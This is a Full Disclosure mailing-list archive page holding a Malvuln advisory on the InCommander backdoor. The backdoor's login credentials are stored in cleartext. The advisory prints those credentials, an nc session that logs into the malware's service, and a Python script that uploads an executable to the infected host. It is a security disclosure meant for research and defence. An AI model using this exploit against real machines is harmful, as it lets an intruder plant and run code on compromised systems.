---
title: Backdoor.Win32.InCommander.17.b / Hardcoded Cleartext	Credentials
url: https://seclists.org/fulldisclosure/2022/Dec/17
source: Full Disclosure
date: 2022-12-22
fetch_date: 2025-10-04T02:15:15.647495
---

# Backdoor.Win32.InCommander.17.b / Hardcoded Cleartext	Credentials

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)

[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)

## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](16)
[By Date](date.html#17)
[![Next](/images/right-icon-16x16.png)](18)

[![Previous](/images/left-icon-16x16.png)](16)
[By Thread](index.html#17)
[![Next](/images/right-icon-16x16.png)](18)

![](/shared/images/nst-icons.svg#search)

# Backdoor.Win32.InCommander.17.b / Hardcoded Cleartext Credentials

---

*From*: malvuln <malvuln13 () gmail com>
*Date*: Wed, 14 Dec 2022 00:46:34 -0500

---

```
Discovery / credits: Malvuln (John Page aka hyp3rlinx) (c) 2022
Original source:
https://malvuln.com/advisory/dd76d8a5874bf8bf05279e35c68449ca.txt
Contact: malvuln13 () gmail com
Media: twitter.com/malvuln
Backup media: infosec.exchange/@malvuln

Threat: Backdoor.Win32.InCommander.17.b
Vulnerability: Hardcoded Cleartext Credentials
Family: InCommander
Type: PE32
MD5: dd76d8a5874bf8bf05279e35c68449ca
Vuln ID: MVID-2022-0665
Dropped files: incsrv.exe
Disclosure: 12/14/2022
Description: The malware listens on TCP port 9400 and 9401 and requires
authentication. However, the username "IncUser-b3" is stored in cleartext
in a file named "incsrv.drv" under Windows dir. The password
"InClientMainPassword" is also stored in cleartext but within the PE file
"incsrv.exe" at offset 000958d0.

Third-party adversaries may then upload thier own executables using ftp
PASV, STOR commands.

Exploit/PoC:
C:\>nc64.exe 192.168.18.125 9401
220 InCommad FTP Server ready.
USER IncUser-b3
331 Password required for IncUser-b3.
PASS InClientMainPassword
230 User IncUser-b3 logged in.
SYST
215 UNIX Type: L8 Internet Component Suite
PASV
227 Entering Passive Mode (192,168,18,125,241,155).
CDUP \
250 CWD command successful. "C:/" is current directory.
STOR DOOM_SM.exe
150 Opening data connection for DOOM_SM.exe.
226 File received ok

from socket import *

MALWARE_HOST="192.168.18.125"
PORT=61851
DOOM="DOOM_SM.exe"

def doit():
    s=socket(AF_INET, SOCK_STREAM)
    s.connect((MALWARE_HOST, PORT))

    f = open(DOOM, "rb")
    EXE = f.read()
    s.send(EXE)

    while EXE:
        s.send(EXE)
        EXE=f.read()

    s.close()

    print("By Malvuln");

if __name__=="__main__":
    doit()

Disclaimer: The information contained within this advisory is supplied
"as-is" with no warranties or guarantees of fitness of use or otherwise.
Permission is hereby granted for the redistribution of this advisory,
provided that it is not altered except by reformatting it, and that due
credit is given. Permission is explicitly given for insertion in
vulnerability databases and similar, provided that due credit is given to
the author. The author is not responsible for any misuse of the information
contained herein and accepts no responsibility for any damage caused by the
use or misuse of this information. The author prohibits any malicious use
of security related information or exploits by the author or elsewhere. Do
not attempt to download Malware samples. The author of this website takes
no responsibility for any kind of damages occurring from improper Malware
handling or the downloading of ANY Malware mentioned on this website or
elsewhere. All content Copyright (c) Malvuln.com (TM).
_______________________________________________
Sent through the Full Disclosure mailing list
https://nmap.org/mailman/listinfo/fulldisclosure
Web Archives & RSS: https://seclists.org/fulldisclosure/
```

---

[![Previous](/images/left-icon-16x16.png)](16)
[By Date](date.html#17)
[![Next](/images/right-icon-16x16.png)](18)

[![Previous](/images/left-icon-16x16.png)](16)
[By Thread](index.html#17)
[![Next](/images/right-icon-16x16.png)](18)

### Current thread:

* **Backdoor.Win32.InCommander.17.b / Hardcoded Cleartext Credentials** *malvuln (Dec 20)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")